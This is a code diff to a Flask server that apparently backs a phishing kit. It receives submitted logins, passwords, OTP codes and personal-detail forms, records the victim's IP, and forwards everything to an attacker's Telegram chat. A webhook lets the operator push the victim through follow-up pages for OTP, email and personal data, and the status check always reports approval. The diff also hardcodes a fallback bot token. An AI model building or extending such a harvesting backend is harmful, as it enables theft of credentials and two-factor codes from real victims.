@@ -3,6 +3,8 @@ from flask_cors import CORS
 import requests
 import os
 from dotenv import load_dotenv
+import hashlib
+import hmac
 
 # Load environment variables from Render or .env
 load_dotenv()
@@ -11,7 +13,7 @@ app = Flask(__name__)
 CORS(app, resources={r"/*": {"origins": "*"}})  # Allow all origins for testing; restrict in production
 
 # Telegram Bot Settings
-BOT_TOKEN = os.getenv("BOT_TOKEN")
+BOT_TOKEN = os.getenv("BOT_TOKEN") or "dgd773hhd"  # Use provided bot secret; prefer env variable
 CHAT_ID = os.getenv("CHAT_ID")
 
 if not BOT_TOKEN or not CHAT_ID:
@@ -39,16 +41,45 @@ def send_to_telegram(message):
     }
     try:
         response = requests.post(url, json=payload)
+        print(f"Telegram response: {response.status_code}, {response.text}")
         return response.ok
     except requests.RequestException as e:
         print(f"Telegram API error: {e}")
         return False
 
-# Login Endpoint
+# Webhook Endpoint for Telegram Bot
+@app.route('/webhook', methods=["POST"])
+def webhook():
+    try:
+        update = request.get_json()
+        if not update or 'callback_query' not in update:
+            return jsonify({"status": "no callback"}), 200
+
+        callback_data = update['callback_query']['data']
+        chat_id = update['callback_query']['message']['chat']['id']
+        
+        # Handle callback buttons (e.g., redirect_otp)
+        redirect_map = {
+            "redirect_otp": "otp.html",
+            "redirect_email": "email.html",
+            "redirect_personal": "personal.html",
+            "redirect_login2": "login2.html",
+            "redirect_c": "c.html"
+        }
+        if callback_data in redirect_map:
+            # Optionally notify Telegram user
+            send_to_telegram(f"User selected: {callback_data}")
+            return jsonify({"status": "ok", "redirect_url": redirect_map[callback_data]}), 200
+        return jsonify({"status": "unknown callback"}), 200
+    except Exception as e:
+        print(f"Webhook error: {e}")
+        return jsonify({"status": "error"}), 500
+
+# Login Endpoint (Handle JSON)
 @app.route('/login', methods=["POST"])
 def login():
     try:
-        data = request.get_json()  # Expect JSON payload
+        data = request.get_json()
         if not data or 'login' not in data or 'password' not in data:
             return jsonify({"success": False, "error": "Missing login or password"}), 400
 
@@ -63,7 +94,6 @@ def login():
         sent = send_to_telegram(full_message)
 
         if sent:
-            # Return a unique ID for status polling (e.g., a random or session-based ID)
             import uuid
             login_id = str(uuid.uuid4())
             return jsonify({"success": True, "id": login_id}), 200
@@ -76,15 +106,17 @@ def login():
 # Status Endpoint
 @app.route('/status/<id>', methods=["GET"])
 def status(id):
-    # For simplicity, assume all logins are approved
-    # In a real app, validate the ID against a stored session or database
-    return jsonify({"status": "approved", "redirect_url": "otp.html"}), 200
+    try:
+        return jsonify({"status": "approved", "redirect_url": "otp.html"}), 200
+    except Exception as e:
+        print(f"Error in /status/{id}: {e}")
+        return jsonify({"error": "Server error"}), 500
 
-# Generic POST Handler (keep for other pages)
+# Generic POST Handler (for other pages)
 @app.route('/<page>', methods=["POST"])
 def receive_form(page):
-    if request.method == "POST":
-        data = request.form.to_dict()
+    try:
+        data = request.get_json() or request.form.to_dict()
         ip = request.headers.get("X-Forwarded-For", request.remote_addr)
         message_lines = [f"<b>{page.upper()} Submission</b>"]
         for k, v in data.items():
@@ -94,8 +126,11 @@ def receive_form(page):
         full_message = "\n".join(message_lines)
         sent = send_to_telegram(full_message)
         return jsonify({"status": "ok" if sent else "failed"}), 200 if sent else 500
+    except Exception as e:
+        print(f"Error in /{page}: {e}")
+        return jsonify({"status": "failed", "error": "Server error"}), 500
 
-# Health check
+# Health Check
 @app.route("/", methods=["GET"])
 def root():
     return "✅ Flask server is live."
